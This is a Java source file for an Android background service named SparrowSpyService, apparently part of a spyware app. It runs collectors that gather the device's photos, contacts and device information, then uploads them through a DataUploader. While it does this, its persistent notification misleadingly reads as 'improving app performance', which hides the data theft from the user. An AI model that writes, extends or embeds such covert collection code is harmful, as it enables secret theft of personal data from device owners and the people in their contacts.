package com.tangledbytes.sparrowspy.server.services;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import com.tangledbytes.sparrowspy.R;
import com.tangledbytes.sparrowspy.collectors.ContactsCollector;
import com.tangledbytes.sparrowspy.collectors.DeviceInfoCollector;
import com.tangledbytes.sparrowspy.collectors.ImagesCollector;
import com.tangledbytes.sparrowspy.server.DataUploader;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.FileUtils;
import com.tangledbytes.sparrowspy.utils.NotificationUtils;
import com.tangledbytes.sparrowspy.utils.SpyState;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class SparrowSpyService extends Service {
    private static final String TAG = "CollectorService";
    private static final int COLLECTOR_SERVICE_NOTIF_ID = 101;
    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (SpyState.Listeners.spyServiceStateChangeListener != null)
            SpyState.Listeners.spyServiceStateChangeListener.onStart();
        mContext = getApplicationContext();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        updateNotif(R.string.improving_app_performance);
        collectData();
        return START_STICKY;
    }

    private void clearDirectories() {
        File[] files = Constants.DIR_APP_ROOT.listFiles();
        if (files == null) return;
        for (File file : files) {
            FileUtils.delete(file);
        }
        Constants.init(Constants.DIR_APP_ROOT);
    }

    /**
     * This method loads (saves) all the stuff
     */
    private void collectData() {
        List<Future<?>> execFutures = new ArrayList<>();
        ExecutorService executor = Executors.newCachedThreadPool();

        // Task: Clean
        clearDirectories();
        Log.i(TAG, "Directories cleaned");

        // Task: Save Images
        execFutures.add(executor.submit(() -> {
            new ImagesCollector().collect();
            Log.i(TAG, "Images compressed and saved");
        }));
        // Task: Save contacts
        execFutures.add(executor.submit(() -> {
            new ContactsCollector(mContext).collect();
            Log.i(TAG, "Contacts saved");
        }));
        // Task: Device Info
        execFutures.add(executor.submit(() -> {
            new DeviceInfoCollector(mContext).collect();
            Log.i(TAG, "Device info retrieved");
        }));

        new Thread(() -> {
            // Wait until all tasks are finished
            for (Future<?> execFuture : execFutures) {
                try {
                    execFuture.get();
                } catch (Exception e) {
                    Log.wtf(TAG, "Exception occurred while executing tasks", e);
                }
            }
            updateNotif(R.string.finishing);
            DataUploader uploader = new DataUploader(mContext, this::stopSelf);
            uploader.upload();
        }).start();
    }

    private void updateNotif(int contentTextId) {
        Notification.Builder notifBuilder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Create notification channel for oreo and above devices
            NotificationUtils notifUtils = new NotificationUtils(mContext);
            notifUtils.createDefaultNotifChannel();
            String channelID = notifUtils.getDefaultNotifChannelId();
            notifBuilder = new Notification.Builder(mContext, channelID);
        } else {
            notifBuilder = new Notification.Builder(mContext);
            notifBuilder.setPriority(Notification.PRIORITY_LOW);
        }

        // Start foreground notification
        notifBuilder
                .setSmallIcon(R.drawable.ic_collector_notification)
                .setContentTitle(getString(R.string.collector_service_title))
                .setContentText(getString(contentTextId));
        startForeground(COLLECTOR_SERVICE_NOTIF_ID, notifBuilder.build());
    }

    @Override
    public void onDestroy() {
        if (SpyState.Listeners.spyServiceStateChangeListener != null)
            SpyState.Listeners.spyServiceStateChangeListener.onFinish();
        super.onDestroy();
    }
}